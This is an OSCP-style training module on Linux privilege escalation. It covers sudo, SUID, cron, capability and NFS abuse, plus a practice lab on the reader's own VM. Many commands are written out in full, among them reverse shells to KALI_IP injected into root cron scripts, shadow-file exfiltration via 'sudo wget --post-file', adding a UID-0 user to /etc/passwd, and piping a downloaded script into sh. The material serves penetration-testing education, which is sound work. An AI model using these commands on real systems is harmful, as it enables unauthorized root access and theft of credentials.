# 09 — Linux Privilege Escalation

Privilege escalation is worth **50% of every standalone machine's points** on the OSCP. Getting initial access earns you 10 points (local.txt). Escalating to root earns you the other 10 (proof.txt). If you can't do privesc, you're leaving half the points on the table.

This module covers every Linux privesc vector you'll encounter on the exam. The process is always: **enumerate → identify the misconfiguration → exploit it → get root**.

---

## The Enumeration Sequence

When you land on a Linux machine, run these commands IN THIS ORDER. The first few commands catch the easiest wins. Don't skip ahead — many people fail privesc because they go straight to kernel exploits when `sudo -l` would have given them root in 30 seconds.

### Step 1: Who am I?

```bash
whoami
id
hostname
```

**Why:** `id` shows your user, your UID, and your groups. Group memberships matter:

| Group | What it gives you |
|---|---|
| `sudo` | Can run commands as root (check `sudo -l`) |
| `wheel` | Same as sudo on CentOS/RHEL |
| `docker` | Can mount the entire filesystem inside a container → root |
| `lxd` / `lxc` | Same concept as docker → root |
| `disk` | Can read raw disk devices → read any file including /etc/shadow |
| `adm` | Can read log files |
| `video` | Can access the framebuffer (screenshot the desktop) |

If you see `docker` or `lxd` in your groups, that's an instant root. Google "docker privilege escalation" or "lxd privilege escalation."

### Step 2: Can I sudo? (CHECK THIS FIRST — ALWAYS)

```bash
sudo -l
```

This is the **#1 privilege escalation vector on the OSCP**. It shows what commands you can run as root (or another user) with sudo.

**Common outputs and what they mean:**

```
# Best case — you can sudo everything
(ALL) NOPASSWD: ALL
→ Just run: sudo bash

# You can run specific commands as root
(root) NOPASSWD: /usr/bin/vim
→ Check GTFOBins for how to exploit vim with sudo

# You can run a command as another user
(john) NOPASSWD: /usr/bin/python3
→ sudo -u john /usr/bin/python3 (escalate to john, then check john's sudo -l)

# You need a password
(root) ALL
→ If you know the current user's password, sudo works. Check .bash_history for password hints.

# Nothing useful
Sorry, user may not run sudo on this host.
→ Move to the next check
```

**The thing people miss:** Sometimes `sudo -l` shows you can run a script as root:

```
(root) NOPASSWD: /opt/scripts/backup.sh
```

Check if you can **write to that script**:
```bash
ls -la /opt/scripts/backup.sh
```

If it's writable, replace its contents with a shell:
```bash
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'bash -i' >> /opt/scripts/backup.sh
sudo /opt/scripts/backup.sh
# Root shell
```

Also check if any of the script's parent directories are writable — you might be able to replace the whole script.

### Step 3: SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**What SUID means:** When a file has the SUID bit set, it runs as the FILE OWNER regardless of who executes it. If a file is owned by root and has SUID, it runs as root — even when you (a regular user) execute it.

**Normal binaries with SUID (expected — don't bother with these):**
```
/usr/bin/passwd         Needs root to modify /etc/shadow — normal
/usr/bin/sudo           Obviously runs as root — normal
/usr/bin/su             Switches users — needs root — normal
/usr/bin/mount          Mounts filesystems — needs root — normal
/usr/bin/umount         Same — normal
/usr/bin/ping           Needs raw sockets — normal (on older systems)
/usr/bin/chfn           Change finger info — normal
/usr/bin/chsh           Change shell — normal
/usr/bin/newgrp         Change group — normal
/usr/bin/gpasswd        Group password admin — normal
```

**Abnormal SUID binaries (the ones you exploit):**
```
/usr/local/bin/find      SUID find is NOT normal
/usr/local/bin/python3   SUID python is NOT normal
/usr/local/bin/vim       SUID vim is NOT normal
/usr/local/bin/bash      SUID bash is NOT normal
/usr/local/bin/nmap      SUID nmap is NOT normal (old versions had interactive mode)
/usr/local/bin/node      SUID node.js is NOT normal
```

The key difference: legitimate SUID binaries live in `/usr/bin/`. Anything in `/usr/local/bin/`, `/opt/`, `/home/`, or `/tmp/` with SUID is suspicious and likely your privesc path.

**How to check each one:** Go to **gtfobins.github.io**, search for the binary name, click "SUID" — it tells you the exact command to get a root shell.

### Step 4: SUID exploitation — the common ones

**SUID find:**
```bash
# find can execute commands with -exec
/usr/local/bin/find . -exec /bin/bash -p \;
# -p tells bash to keep the elevated privileges
```

**Why this works:** `find` runs as root (SUID). `-exec` tells find to run a command. `/bin/bash -p` starts bash and `-p` says "don't drop your privileges." You get a root shell.

**SUID python:**
```bash
/usr/local/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Why this works:** Python runs as root (SUID). `os.setuid(0)` sets the user ID to 0 (root). `os.system("/bin/bash")` spawns a bash shell — which now runs as root.

**SUID bash:**
```bash
/usr/local/bin/bash -p
```

That's it. The `-p` flag tells bash not to drop its effective UID. Since bash runs as root (SUID), you get a root shell.

**SUID vim:**
```bash
# Method 1: Read any file
/usr/local/bin/vim /etc/shadow

# Method 2: Spawn a shell from within vim
/usr/local/bin/vim -c ':!bash -p'

# Method 3: Edit /etc/sudoers or /etc/passwd
/usr/local/bin/vim /etc/sudoers
# Add: yourusername ALL=(ALL) NOPASSWD:ALL
# Save: :wq!
# Then: sudo bash
```

**SUID nmap (old versions only — 2.02 to 5.21):**
```bash
/usr/local/bin/nmap --interactive
nmap> !sh
```

Modern nmap removed interactive mode. But you still see this in CTFs occasionally.

**SUID cp:**
```bash
# Copy /etc/passwd, add a root user, copy it back
cat /etc/passwd > /tmp/passwd
# Generate a password hash
openssl passwd -1 hacker
# Output: $1$xyz$abc...

# Add a root user to the copy
echo 'hacker:$1$xyz$abc...:0:0::/root:/bin/bash' >> /tmp/passwd

# Overwrite the real passwd file
/usr/local/bin/cp /tmp/passwd /etc/passwd

# Login as the new root user
su hacker
# Password: hacker
```

**SUID perl:**
```bash
/usr/local/bin/perl -e 'exec "/bin/bash -p";'
```

**SUID ruby:**
```bash
/usr/local/bin/ruby -e 'exec "/bin/bash -p"'
```

**SUID node:**
```bash
/usr/local/bin/node -e 'require("child_process").spawn("/bin/bash", ["-p"], {stdio: [0, 1, 2]})'
```

### Step 5: sudo command exploitation

When `sudo -l` shows you can run a specific command:

**sudo vim:**
```bash
sudo vim
# Inside vim:
:!bash
# Root shell
```

**sudo find:**
```bash
sudo find / -exec /bin/bash \; -quit
```

**sudo python3:**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**sudo less / more:**
```bash
sudo less /etc/passwd
# Inside less:
!bash
# Root shell
```

**sudo awk:**
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**sudo env:**
```bash
sudo env /bin/bash
```

**sudo man:**
```bash
sudo man man
# Inside man:
!bash
# Root shell
```

**sudo ftp:**
```bash
sudo ftp
ftp> !bash
# Root shell
```

**sudo zip:**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="bash -c 'bash -i'"
```

**sudo tar:**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

**sudo wget (read files — no shell, but can read /etc/shadow):**
```bash
sudo wget --post-file=/etc/shadow http://KALI_IP:8080
# On Kali: nc -lvnp 8080  → the shadow file content arrives
```

**sudo apache2 (read first line of any file):**
```bash
sudo apache2 -f /etc/shadow
# Error message includes the first line of the file (root's hash)
```

**The universal reference:** If `sudo -l` shows ANY binary, search it on **gtfobins.github.io** → click "Sudo" → follow the instructions.

### Step 6: Cron jobs

```bash
# System-wide crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# User-specific cron (current user)
crontab -l

# Other users' crons (need permission)
ls -la /var/spool/cron/crontabs/

# Check for running cron processes
ps aux | grep cron

# Watch for processes that appear periodically (pspy is best for this)
# Upload pspy to the target and run:
./pspy64
```

**What to look for:**

```
# In /etc/crontab, you might see:
* * * * * root /opt/scripts/cleanup.sh
```

This runs `/opt/scripts/cleanup.sh` as root every minute. Check:

```bash
ls -la /opt/scripts/cleanup.sh
# -rwxrwxrwx = world writable!
```

If the script is writable:
```bash
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /opt/scripts/cleanup.sh
# On Kali: nc -lvnp 4444
# Wait up to 60 seconds — root shell arrives
```

**What if the script isn't writable but its DIRECTORY is?**

```bash
ls -la /opt/scripts/
# drwxrwxrwx  → directory is writable!

# Replace the script entirely
mv /opt/scripts/cleanup.sh /opt/scripts/cleanup.sh.bak
echo '#!/bin/bash' > /opt/scripts/cleanup.sh
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /opt/scripts/cleanup.sh
chmod +x /opt/scripts/cleanup.sh
```

**Cron PATH abuse:**

```bash
# In /etc/crontab:
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin
* * * * * root cleanup
```

If the cron job runs `cleanup` (without a full path) and the PATH includes a directory you can write to (`/home/user`), create your own `cleanup`:

```bash
echo '#!/bin/bash' > /home/user/cleanup
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /home/user/cleanup
chmod +x /home/user/cleanup
```

Cron finds YOUR `cleanup` first (because `/home/user` is earlier in the PATH) and runs it as root.

### Step 7: Writable files and directories

```bash
# Files writable by your user
find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys | grep -v /run

# Directories writable by your user
find / -writable -type d 2>/dev/null | grep -v /proc | grep -v /sys | grep -v /run

# Files owned by your user
find / -user $(whoami) -type f 2>/dev/null | grep -v /proc | grep -v /home

# World-writable files
find / -perm -o+w -type f 2>/dev/null | grep -v /proc | grep -v /sys
```

**Interesting writable files:**
```
/etc/passwd      → add a root user
/etc/shadow      → replace root's hash
/etc/sudoers     → give yourself sudo ALL
/etc/crontab     → add a cron job running as root
/root/.ssh/authorized_keys → add your SSH key for root access
Any script that root runs → inject a reverse shell
```

### Step 8: /etc/passwd writable (instant root)

If `/etc/passwd` is writable, you can add a user with UID 0 (root):

```bash
# Generate a password hash
openssl passwd -1 hacker
# Output: $1$abc123$xyz789...

# Add a root user
echo 'hacker:$1$abc123$xyz789...:0:0::/root:/bin/bash' >> /etc/passwd

# Switch to the new user
su hacker
# Password: hacker
# whoami → root
```

**Why this works:** UID 0 = root. Any user with UID 0 in `/etc/passwd` has root privileges. The password hash in `/etc/passwd` overrides `/etc/shadow` for that user.

### Step 9: Capabilities

Linux capabilities are a fine-grained alternative to SUID — they grant specific privileges to a binary without making it fully SUID root.

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null
```

**Exploitable capabilities:**

| Capability | What it allows | Exploit |
|---|---|---|
| `cap_setuid+ep` | Change UID | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_dac_read_search+ep` | Read any file | `tar czf /tmp/shadow.tar.gz /etc/shadow` then extract and crack |
| `cap_net_raw+ep` | Raw sockets (packet capture) | Sniff network traffic for credentials |
| `cap_net_bind_service+ep` | Bind to ports below 1024 | Set up listener on port 80 |

**Example:** Python with `cap_setuid`:

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3 = cap_setuid+ep

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Root shell
```

### Step 10: NFS no_root_squash

```bash
# Check NFS exports (from the target)
cat /etc/exports

# Check NFS exports (from Kali)
showmount -e TARGET_IP
```

If you see `no_root_squash`:
```
/srv/share *(rw,no_root_squash)
```

**This means:** The NFS server doesn't map root on the client to nobody. If you mount the share as root on Kali, you're root on the share. You can create SUID binaries that the target will execute as root.

```bash
# On Kali (as root)
sudo mkdir /mnt/nfs
sudo mount -t nfs TARGET_IP:/srv/share /mnt/nfs

# Create a SUID bash
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash

# On the target
/srv/share/rootbash -p
# Root shell
```

### Step 11: Internal services (running as root)

```bash
# What's listening on localhost only?
ss -tlnp
netstat -tlnp

# Look for services bound to 127.0.0.1 (not accessible from outside)
# MySQL on 127.0.0.1:3306 — might have root creds in a config file
# Web app on 127.0.0.1:8080 — might have internal admin panel
```

If you find MySQL running locally and found credentials in a config file:
```bash
mysql -u root -p'FoundPassword'
# Once in MySQL:
SELECT sys_exec('bash -i >& /dev/tcp/KALI_IP/4444 0>&1');
# Or on older systems:
\! bash
```

### Step 12: Kernel exploits (last resort)

```bash
# Check kernel version
uname -r
uname -a
cat /etc/os-release

# Search for exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1)
```

**Common kernel exploits:**

| CVE | Name | Affected versions |
|---|---|---|
| CVE-2016-5195 | DirtyCow | Linux < 4.8.3 |
| CVE-2021-4034 | PwnKit | Almost all Linux with polkit |
| CVE-2022-0847 | DirtyPipe | Linux 5.8 - 5.16.11 |
| CVE-2021-3156 | Baron Samedit (sudo) | sudo < 1.9.5p2 |

**Why kernel exploits are last resort:**
- They can crash the machine (kills your access)
- On the exam, crashing a machine loses you time while it reboots
- There's usually an easier path (misconfigured sudo, SUID, cron)
- They require downloading, compiling, and transferring — more steps

```bash
# PwnKit (the most reliable modern kernel exploit)
# Download from GitHub, compile, transfer to target
# On target:
chmod +x PwnKit
./PwnKit
# Root shell (works on most Linux systems with polkit installed)
```

---

## Automated Enumeration Tools

### LinPEAS (the best all-in-one)

```bash
# On Kali — serve it
python3 -m http.server 80

# On target — download and run
curl http://KALI_IP/linpeas.sh | sh

# Or save it first
wget http://KALI_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

LinPEAS checks EVERYTHING — sudo, SUID, cron, capabilities, writable files, kernel version, installed software, network connections, config files with passwords. Read its output carefully — it color-codes findings:

```
RED/YELLOW = highly likely privesc vector (check immediately)
RED        = interesting but needs verification
GREEN      = useful information
BLUE       = informational
```

### LinEnum

```bash
wget http://KALI_IP/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Simpler than LinPEAS, catches the basics.

### pspy (watch processes without root)

```bash
# Upload and run
./pspy64
```

Shows processes as they start — catches cron jobs that run as root, even ones you can't see in `/etc/crontab`. Let it run for 5 minutes and watch what appears.

---

## The Linux Privesc Checklist (print this)

```
□ whoami / id / groups
□ sudo -l (CHECK THIS FIRST)
□ find / -perm -4000 -type f 2>/dev/null (SUID)
□ getcap -r / 2>/dev/null (capabilities)
□ cat /etc/crontab && ls -la /etc/cron* (cron jobs)
□ find / -writable -type f 2>/dev/null (writable files)
□ ls -la /etc/passwd /etc/shadow (writable?)
□ cat /etc/passwd | grep -v nologin (real users)
□ cat /home/*/.bash_history 2>/dev/null (credential hints)
□ find / -name "*.conf" -exec grep -li "pass" {} \; (configs with passwords)
□ ss -tlnp (internal services)
□ cat /etc/exports (NFS no_root_squash)
□ uname -r (kernel version → searchsploit)
□ Upload and run LinPEAS
```

---

## Lab: Practice Every Privesc Vector

### Set up on your Debian VM

```bash
# Create a test user
sudo useradd -m -s /bin/bash testuser
echo "testuser:testpass" | sudo chpasswd

# === SUDO misconfiguration ===
echo "testuser ALL=(root) NOPASSWD: /usr/bin/find" | sudo tee /etc/sudoers.d/testuser

# === SUID binary ===
sudo cp /usr/bin/python3 /usr/local/bin/python3_suid
sudo chmod u+s /usr/local/bin/python3_suid

# === Writable cron script ===
sudo mkdir -p /opt/scripts
echo '#!/bin/bash' | sudo tee /opt/scripts/maintenance.sh
echo 'echo "cleanup ran" >> /tmp/cron_log' | sudo tee -a /opt/scripts/maintenance.sh
sudo chmod 777 /opt/scripts/maintenance.sh
echo "* * * * * root /opt/scripts/maintenance.sh" | sudo tee /etc/cron.d/maintenance

# === Writable /etc/passwd (dangerous — only for practice) ===
# Don't do this: sudo chmod 666 /etc/passwd
# Instead practice the TECHNIQUE without actually making it writable

# Create the flag
echo "FLAG{linux_privesc_complete}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt
```

### Practice as the test user

```bash
su - testuser
# Password: testpass

# Check sudo
sudo -l
# Shows: (root) NOPASSWD: /usr/bin/find

# Exploit sudo find
sudo find / -exec /bin/bash \; -quit
whoami
# root
cat /root/flag.txt
# Exit back to testuser
exit

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Shows: /usr/local/bin/python3_suid

# Exploit SUID python
/usr/local/bin/python3_suid -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
# root
exit

# Check cron
cat /etc/cron.d/maintenance
ls -la /opt/scripts/maintenance.sh
# World writable!

# Exploit writable cron (inject reverse shell or just read the flag)
echo '#!/bin/bash' > /opt/scripts/maintenance.sh
echo 'cat /root/flag.txt > /tmp/flag_output' >> /opt/scripts/maintenance.sh
chmod +x /opt/scripts/maintenance.sh
# Wait 60 seconds
cat /tmp/flag_output
# FLAG{linux_privesc_complete}
```

### Clean up

```bash
sudo userdel -r testuser
sudo rm /usr/local/bin/python3_suid
sudo rm /opt/scripts/maintenance.sh
sudo rm /etc/cron.d/maintenance
sudo rm /etc/sudoers.d/testuser
sudo rm /root/flag.txt
```

---

## Exam Tips for Linux Privesc

1. **sudo -l is first. Always.** Before anything else. Before LinPEAS. Before SUID search. Check sudo -l.

2. **GTFOBins is your bible.** Bookmark it. For every SUID binary and sudo entry, check GTFOBins. It has the exact commands for dozens of binaries.

3. **Run LinPEAS and READ the output.** Don't just run it and skim. Read the red/yellow highlighted items carefully. The answer is in there.

4. **Check bash history.** `cat /home/*/.bash_history` sometimes reveals passwords, connection strings, or commands that hint at the privesc path.

5. **Check config files for passwords.** Web apps, database configs, backup scripts — passwords are everywhere. `grep -r "password" /var/www/ /opt/ /etc/ 2>/dev/null`.

6. **Don't go to kernel exploits first.** They crash machines and waste time. There's almost always an easier path through sudo, SUID, cron, or writable files.

7. **Try found passwords for su root.** Sometimes the privesc is just `su root` with a password you found in a config file. Simple but effective.

8. **If the obvious path doesn't work, re-enumerate.** There might be a second privesc vector you missed. Run the full checklist again.
